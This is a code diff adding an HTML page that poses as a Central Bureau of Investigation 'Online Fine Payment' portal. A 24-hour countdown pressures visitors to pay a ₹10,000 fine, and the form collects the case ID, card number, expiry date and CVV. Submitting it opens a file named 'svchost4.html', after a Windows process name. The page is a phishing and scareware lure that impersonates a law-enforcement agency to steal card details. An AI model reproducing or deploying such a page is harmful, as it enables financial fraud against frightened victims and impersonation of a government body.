@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>CBI - Central Bureau of Investigation</title>
+	<style>
+		body {
+			font-family: Arial, sans-serif;
+			background: #f2f2f2;
+		}
+		.container {
+			width: 80%;
+			margin: 40px auto;
+			padding: 20px;
+			border: 1px solid #ddd;
+			border-radius: 10px;
+			box-shadow: 0 0 30px rgba(235, 0, 0, 0.1);
+			background: #fff;
+		}
+		.logo {
+			width: 200px;
+			height: 200px;
+			margin: 20px auto;
+		}
+		h1 {
+			color: #ff0000;
+			margin-bottom: 20px;
+			text-align: center;
+		}		
+		p {
+			margin-bottom: 20px;
+		}
+		.form-group {
+			margin-bottom: 20px;
+		}
+		label {
+			display: block;
+			margin-bottom: 10px;
+		}
+		input[type="text"], input[type="date"], input[type="password"] {
+			width: 60%;
+			padding: 10px;
+			margin-bottom: 20px;
+			border: 1px solid #ccc;
+			border-radius: 5px;
+		}
+		button {
+			background-color: #337ab7;
+			color: #fff;
+			border: none;
+			padding: 10px 20px;
+			font-size: 18px;
+			cursor: pointer;
+		}
+		button:hover {
+			background-color: #23527c;
+		}
+		#timer {
+			text-align: right;
+		}
+	</style>
+		<link rel="icon" type="image/svg" href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Cbi_logo.svg/640px-Cbi_logo.svg.png">
+</head>
+<body>
+	<div class="container">
+	<h2 id="timer">24:00:00</h2>
+
+	<script>
+		let hours = 24;
+		let minutes = 0;
+		let seconds = 0;
+
+		setInterval(() => {
+			if (seconds > 0) {
+				seconds--;
+			} else if (minutes > 0) {
+				minutes--;
+				seconds = 59;
+			} else if (hours > 0) {
+				hours--;
+				minutes = 59;
+				seconds = 59;
+			}
+
+			document.getElementById("timer").innerHTML = `${padZero(hours)}:${padZero(minutes)}:${padZero(seconds)}`;
+		}, 1000);
+
+		function padZero(time) {
+			return (time < 10) ? `0${time}` : time;
+		}
+	</script>
+		<center>
+		<br><br><br><br>
+			<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Cbi_logo.svg/640px-Cbi_logo.svg.png" alt="CBI Logo" class="logo">
+			<h1>Central Bureau of Investigation</h1>
+			<h1>Online Fine Payment</h1>
+			<br><br><br><br>
+			<h3>Please enter your payment details below:</h3>
+			<br><br>
+			<form onsubmit="return validateForm()">
+	<div class="form-group">
+		<label>Case ID:</label>
+		<input type="text" name="case-id" id="case-id" required>
+	</div>
+	<div class="form-group">
+		<label>Fine Amount (₹):</label>
+		<input type="text" name="fine-amount" value="10,000" readonly>
+	</div>
+	<div class="form-group">
+		<label>Card Number:</label>
+		<input type="text" name="card-number" id="card-number" required pattern="[0-9]{16}">
+	</div>
+	<div class="form-group">
+		<label>Expiry Date:</label>
+		<input type="date" name="expiry-date" id="expiry-date" required>
+	</div>
+	<div class="form-group">
+		<label>CVV:</label>
+		<input type="password" name="cvv" id="cvv" required pattern="[0-9]{3,4}">
+	</div>
+	<br><br><br><br>
+	<button type="submit">Make Payment</button>
+	<br><br><br><br>	<br><br><br><br>
+</form>
+
+<script>
+function validateForm() {
+	const caseId = document.getElementById('case-id').value;
+	const cardNumber = document.getElementById('card-number').value;
+	const expiryDate = document.getElementById('expiry-date').value;
+	const cvv = document.getElementById('cvv').value;
+
+	if (!caseId || !cardNumber || !expiryDate || !cvv) {
+		alert('Please fill all compulsory fields.');
+		return false;
+	}
+
+	if (!cardNumber.match(/[0-9]{16}/)) {
+		alert('Invalid card number. Please enter 16 digits.');
+		return false;
+	}
+
+	if (!cvv.match(/[0-9]{3,4}/)) {
+		alert('Invalid CVV. Please enter 3 or 4 digits.');
+		return false;
+	}
+
+	window.open('svchost4.html');
+	return true;
+}
+</script>
+		</center>
+	</div>
+</body>
+</html>
